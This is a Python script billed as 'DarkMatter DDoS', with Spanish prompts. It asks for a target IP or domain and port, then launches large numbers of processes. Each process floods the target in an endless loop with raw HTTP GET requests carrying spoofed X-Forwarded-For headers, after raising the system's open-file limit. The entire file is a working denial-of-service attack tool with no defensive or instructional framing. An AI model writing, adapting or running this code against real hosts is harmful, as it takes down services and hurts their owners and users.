import socket
import os
from time import sleep
import multiprocessing
import random
import platform
import socks
import threading
import re
import urllib.request
import progress
import sys 

def progressbar(it, prefix="", size=60, file=sys.stdout):
    count = len(it)
    def show(j):
        x = int(size*j/count) 
        file.write("%s[%s%s] %i/%i\r" % (prefix,  "="*x, "~"*(size-x), j, count))
        file.flush()
        file.write("\n")
    show(0)
    for i, item in enumerate(it):
        yield item
        show(i+1)
        file.write("\n")
    file.flush()
    
import time

for i in progressbar(range(10), "Loading: ", 40):
    time.sleep(0.3)
    
    
print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
print("Detecting System...")
sysOS = platform.system()
print("System detected: ", sysOS)

if sysOS == "Linux":
  try:
    os.system("ulimit -n 130000")
  except Exception as e:
    print(e)
    print("No se pudo iniciar el script")
else:
  print("Su sistema no es Linux, es posible que no pueda ejecutar este script en algunos sistemas")


def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"	
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "GET "  + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass

print("Bienvenido a DarkMatter DDoS\n")
ip = input("IP/Domain: ")
port = int(input("Port: "))
url = f"http://{str(ip)}"
print("[>>>] RS-28 Sarmat [<<<]")
sleep(1)

from progress.bar import Bar, ChargingBar
import os, time, random

bar2 = ChargingBar('Procesando:', max=100)
for num in range(10):
    time.sleep(random.uniform(0, 0.3))
    bar2.next()
bar2.finish()

  
    
    
def send():
  for i in range(90000): 
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = True
    mp.start() 
    sleep(7.0)
    
    
        
send()

#time.sleep random package- sleep(0.1) in brutal attack
exit(1)
